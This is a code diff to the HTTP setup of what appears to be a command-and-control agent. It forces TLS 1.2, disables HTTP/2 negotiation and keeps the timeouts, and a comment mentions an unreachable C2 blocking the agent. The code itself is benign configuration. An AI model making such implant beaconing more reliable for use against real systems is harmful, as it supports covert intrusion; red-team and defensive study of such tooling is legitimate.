@@ -18,11 +18,33 @@ BOOL http_init(void) {
     if (!g_hSession) return FALSE;
 
     /*
-     * Set explicit timeouts to prevent indefinite blocking.
-     * Without these, WinHTTP uses system defaults:
-     *   DNS resolve = infinite(!), connect = 60s, send = 30s, receive = 30s
-     * A single unreachable C2 can block the agent for minutes per attempt.
+     * Force TLS 1.2 only.  WinHTTP + Schannel TLS 1.3 has known handshake
+     * interop issues with OpenSSL servers (renegotiation, ALPN mismatch,
+     * post-handshake auth).  TLS 1.2 is universally supported.
      *
+     * MUST be set on the session handle BEFORE any WinHttpConnect calls.
+     */
+    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+    if (!WinHttpSetOption(g_hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
+                          &protocols, sizeof(protocols))) {
+        DBG("[http] WARNING: WinHttpSetOption(SECURE_PROTOCOLS) failed err=%u",
+            GetLastError());
+    } else {
+        DBG("[http] forced TLS 1.2 only (protocols=0x%08X)", protocols);
+    }
+
+    /*
+     * Disable HTTP/2 ALPN negotiation.  When WinHTTP sends h2 in the ALPN
+     * extension but the server doesn't support it properly, the TLS
+     * handshake can stall.  Force HTTP/1.1 only.
+     */
+    DWORD http_proto = 0;  /* 0 = HTTP/1.1 only, no HTTP/2 */
+    WinHttpSetOption(g_hSession, WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL,
+                     &http_proto, sizeof(http_proto));
+    DBG("[http] HTTP/2 ALPN disabled (HTTP/1.1 only)");
+
+    /*
+     * Set explicit timeouts to prevent indefinite blocking.
      * Args: hSession, DNS resolve ms, connect ms, send ms, receive ms
      */
     WinHttpSetTimeouts(g_hSession,
